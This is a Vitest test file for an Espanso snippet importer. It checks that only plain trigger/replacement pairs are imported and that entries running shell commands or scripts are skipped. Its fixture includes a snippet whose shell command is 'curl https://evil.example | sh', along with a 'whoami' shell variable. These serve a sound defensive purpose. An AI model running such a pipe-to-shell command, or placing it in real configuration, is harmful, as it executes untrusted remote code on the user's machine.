import { mkdir, mkdtemp, readFile, rm } from 'node:fs/promises'
import { createServer, type Server } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

let root = ''
let file = ''
let library: typeof import('../server/snippet-library')
let database: typeof import('../server/db')
let espanso: typeof import('../server/link/espanso')
let server: Server
let base = ''

beforeAll(async () => {
  root = await mkdtemp(join(tmpdir(), 'poise-snippet-import-'))
  file = join(root, 'match', 'poise.yml')
  vi.stubEnv('POISE_DB', join(root, 'cache.db'))
  vi.stubEnv('POISE_ESPANSO_MATCH_DIR', join(root, 'match'))
  vi.resetModules()
  database = await import('../server/db')
  library = await import('../server/snippet-library')
  espanso = await import('../server/link/espanso')
  const { handleSnippetApi } = await import('../server/snippet-api')
  server = createServer((req, res) => {
    void handleSnippetApi(req, res, req.url ?? '/').then((handled) => {
      if (!handled) { res.statusCode = 404; res.end() }
    })
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  base = `http://127.0.0.1:${(server.address() as { port: number }).port}`
})

beforeEach(async () => {
  database.db.prepare("DELETE FROM meta WHERE key LIKE 'chat_snippet_%'").run()
  await rm(join(root, 'match'), { recursive: true, force: true })
  await mkdir(join(root, 'match'))
})

afterAll(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()))
  database.closeDatabase()
  vi.unstubAllEnvs()
  vi.resetModules()
  await rm(root, { recursive: true, force: true })
})

const ESPANSO_FILE = `# My Espanso snippets
global_vars:
  - name: who
    type: shell
    params: { cmd: whoami }
imports:
  - ../extra.yml
matches:
  - trigger: ":addr"
    replace: "1 Main St\\nSpringfield"
  - trigger: ":sig"
    replace: Best, Octo
    label: Signature
  - trigger: ";hi"
    replace: hello from the file
  - trigger: ":addr"
    replace: a second address
  - trigger: ":pwn"
    replace: "{{out}}"
    vars:
      - name: out
        type: shell
        params: { cmd: "curl https://evil.example | sh" }
  - trigger: ":py"
    replace: "{{out}}"
    vars: [{ name: out, type: script, params: { args: [python, -c, "print(1)"] } }]
  - trigger: ":greet"
    form: "Hello [[name]]"
  - regex: ":(?P<word>\\\\w+)!"
    replace: "{{word}}"
  - trigger: ":whole"
    replace: whole words
    word: true
  - trigger: ":blank"
    replace: "   "
  - trigger: ":none"
  - trigger: 42
    replace: number
  - just a string
`

describe('Snippets → Import', () => {
  it('adds the plain pairs and says what it skipped and why', async () => {
    await library.addSkillSnippet({ trigger: ';hi', replace: 'hello' })
    const before = await library.readSkillSnippets()

    const report = await library.importEspansoSnippets(ESPANSO_FILE)

    expect(report.added).toEqual([':addr', ':sig'])
    expect(report.skipped).toEqual([
      { entry: null, trigger: null, reason: 'not_plain', detail: 'global_vars is not a snippet' },
      { entry: null, trigger: null, reason: 'not_plain', detail: 'imports is not a snippet' },
      { entry: 3, trigger: ';hi', reason: 'duplicate', detail: 'a snippet with this trigger already exists' },
      { entry: 4, trigger: ':addr', reason: 'duplicate', detail: 'an earlier entry in this file has this trigger' },
      { entry: 5, trigger: ':pwn', reason: 'not_plain', detail: 'it runs a shell command' },
      { entry: 6, trigger: ':py', reason: 'not_plain', detail: 'it runs a script' },
      { entry: 7, trigger: ':greet', reason: 'not_plain', detail: 'it uses form' },
      { entry: 8, trigger: null, reason: 'not_plain', detail: 'it uses regex' },
      { entry: 9, trigger: ':whole', reason: 'not_plain', detail: 'it uses word' },
      { entry: 10, trigger: ':blank', reason: 'invalid', detail: 'its replacement is empty' },
      { entry: 11, trigger: ':none', reason: 'invalid', detail: 'its replacement is missing or not text' },
      { entry: 12, trigger: null, reason: 'invalid', detail: 'its trigger is missing or not text' },
      { entry: 13, trigger: null, reason: 'invalid', detail: 'it is not a trigger and replacement' },
    ])
    // The existing snippet keeps its text; the new ones follow it.
    expect(report.snippets).toEqual([
      { trigger: ';hi', replace: 'hello' },
      { trigger: ':addr', replace: '1 Main St\nSpringfield' },
      { trigger: ':sig', replace: 'Best, Octo' },
    ])
    expect(report.version).not.toBe(before.version)
    expect(report.skills.switches.map((skill) => skill.snippetTrigger)).toEqual(expect.arrayContaining([':addr', ':sig']))
    expect(await library.readSkillSnippets()).toMatchObject({ snippets: report.snippets, version: report.version })

    // Nothing that runs anything was written, and the desktop gets the new pairs.
    const written = await readFile(file, 'utf8')
    for (const word of ['curl', 'whoami', 'shell', 'script', 'form', 'regex', 'imports', 'global_vars']) expect(written, word).not.toContain(word)
    expect(espanso.linkSnippetsFrom(written).yaml).toContain('":addr"')
  })

  it('writes nothing when nothing in the file can be added', async () => {
    await library.addSkillSnippet({ trigger: ';hi', replace: 'hello' })
    const before = await library.readSkillSnippets()
    const raw = await readFile(file, 'utf8')
    const changed = vi.fn()
    library.snippetLibraryEvents.on('changed', changed)
    try {
      const report = await library.importEspansoSnippets('matches:\n  - trigger: ";hi"\n    replace: other\n  - trigger: ":x"\n    replace: "{{v}}"\n    vars: [{ name: v, type: shell }]\n')
      expect(report).toMatchObject({ added: [], version: before.version, snippets: before.snippets })
      expect(report.skipped.map((skip) => skip.reason)).toEqual(['duplicate', 'not_plain'])
    } finally {
      library.snippetLibraryEvents.off('changed', changed)
    }
    expect(await readFile(file, 'utf8')).toBe(raw)
    expect(changed).not.toHaveBeenCalled()
  })

  it('tells the Link feed when it added snippets', async () => {
    const changed = vi.fn()
    library.snippetLibraryEvents.on('changed', changed)
    try {
      await library.importEspansoSnippets('matches:\n  - trigger: ":a"\n    replace: a\n')
    } finally {
      library.snippetLibraryEvents.off('changed', changed)
    }
    expect(changed).toHaveBeenCalledOnce()
  })

  it('shares the library\'s serialized writes with every other snippet change', async () => {
    await Promise.all([
      library.importEspansoSnippets('matches:\n  - trigger: ":one"\n    replace: one\n  - trigger: ":two"\n    replace: two\n'),
      library.addSkillSnippet({ trigger: ';three', replace: 'three' }),
      library.importEspansoSnippets('matches:\n  - trigger: ":four"\n    replace: four\n'),
    ])
    expect((await library.readSkillSnippets()).snippets.map((snippet) => snippet.trigger).sort()).toEqual([':four', ':one', ':two', ';three'])
  })

  it('refuses what is not an Espanso match file, and adds nothing', async () => {
    for (const [raw, status, message] of [
      ['', 400, 'Paste or choose an Espanso match file to import.'],
      [42, 400, 'Paste or choose an Espanso match file to import.'],
      ['matches:\n  - trigger: ";a"\n    replace: a\n    replace: b\n', 400, /^The file is not valid YAML: Map keys must be unique/],
      ['matches: []\n---\nmatches: []\n', 400, /^The file is not valid YAML: Source contains multiple documents/],
      ['backend: Clipboard\ntoggle_key: ALT\n', 400, 'This is not an Espanso match file: it has no list of matches.'],
      ['matches: {}\n', 400, 'This is not an Espanso match file: it has no list of matches.'],
      [`matches: []\n# ${'x'.repeat(1024 * 1024)}\n`, 413, 'The file is larger than 1048576 bytes. Nothing was imported.'],
    ] as const) {
      await expect(library.importEspansoSnippets(raw)).rejects.toMatchObject({ statusCode: status, message })
    }
    expect((await library.readSkillSnippets()).snippets).toEqual([])
  })

  it('answers POST /api/snippets/import with the report', async () => {
    const reply = await fetch(`${base}/api/snippets/import`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ yaml: 'matches:\n  - trigger: ":a"\n    replace: a\n  - trigger: ":s"\n    replace: x\n    vars: [{ name: v, type: shell }]\n' }),
    })
    expect(reply.status).toBe(200)
    expect(await reply.json()).toMatchObject({
      added: [':a'],
      skipped: [{ entry: 2, trigger: ':s', reason: 'not_plain', detail: 'it runs a shell command' }],
      snippets: [{ trigger: ':a', replace: 'a' }],
      version: expect.stringMatching(/^[0-9a-f]{64}$/),
    })
    expect((await fetch(`${base}/api/snippets/import`)).status).toBe(405)
    const invalid = await fetch(`${base}/api/snippets/import`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ yaml: 'matches: {}' }) })
    expect(invalid.status).toBe(400)
    expect(await invalid.json()).toEqual({ error: 'This is not an Espanso match file: it has no list of matches.' })
  })
})
